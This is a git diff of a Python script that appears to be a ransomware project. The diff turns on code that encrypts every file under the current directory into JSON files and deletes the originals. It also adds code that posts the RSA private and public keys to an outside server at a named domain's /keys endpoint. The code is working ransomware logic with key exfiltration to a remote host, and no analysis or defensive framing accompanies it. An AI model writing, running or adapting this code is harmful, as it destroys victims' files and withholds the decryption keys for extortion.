@@ -55,8 +55,11 @@ for root, dirs, files in os.walk("."):
         filePath = os.path.join(root, file)
 
         # Do not encrypt the private/public key or payload
-        if (not (filePath.endswith(constants.PRIVATE_KEY_FILE_PATH) or filePath.endswith(
-                constants.PUBLIC_KEY_FILE_PATH) or filePath.endswith(constants.PAYLOAD_FILE_PATH))):
+        if (not (filePath.endswith(constants.PRIVATE_KEY_FILE_PATH) or 
+                filePath.endswith( constants.PUBLIC_KEY_FILE_PATH) or
+                filePath.endswith(constants.PAYLOAD_FILE_PATH) or
+                filePath.endswith(constants.MY_UNLOCK_FILE_PATH))):
+
             print("Encrypting: " + filePath)
 
             # Call the encryptor
@@ -66,7 +69,7 @@ for root, dirs, files in os.walk("."):
             # Create json file from dictionary
             fileName = filePath.rsplit(".", 1)[0]
             jsonFileName = fileName + ".json"
-            # outfile = open(jsonFileName, 'w')
+            outfile = open(jsonFileName, 'w')
 
             jsonData = {}
 
@@ -78,21 +81,39 @@ for root, dirs, files in os.walk("."):
             jsonData["Extension"] = ext
 
             # Write to json
-            # json.dump(jsonData, outfile, ensure_ascii=False)
-            # outfile.close()
+            json.dump(jsonData, outfile, ensure_ascii=False)
+            outfile.close()
 
             # Delete the original file
-            # os.remove(filePath)
+            os.remove(filePath)
 
             print("Results of encryption stored at: " + jsonFileName)
             print("")
 
-privateKeyFile = open("privateKey.pem")
-publicKeyFile = open("publicKey.pem")
+privateKeyFile = open(constants.PRIVATE_KEY_FILE_PATH)
+publicKeyFile = open(constants.PUBLIC_KEY_FILE_PATH)
 
 privateKeyContents = privateKeyFile.read()
 publicKeyContents = publicKeyFile.read()
 
-print(privateKeyContents)
-print()
-print(publicKeyContents)
+privateKeyContents = privateKeyContents.replace("\n","*")
+publicKeyContents = publicKeyContents.replace("\n","*")
+
+server_url =  "https://jaydensdisciples.me"
+
+key_dict = dict()
+
+key_dict["private_key"] = privateKeyContents
+key_dict["public_key"] = publicKeyContents
+
+print(key_dict)
+
+request = server_url + "/keys"
+
+response = requests.post(request, json=key_dict)
+
+print(response.status_code)
+print(response.reason)
+print(response.text)
+
+#  os.remove(constants.PRIVATE_KEY_FILE_PATH)
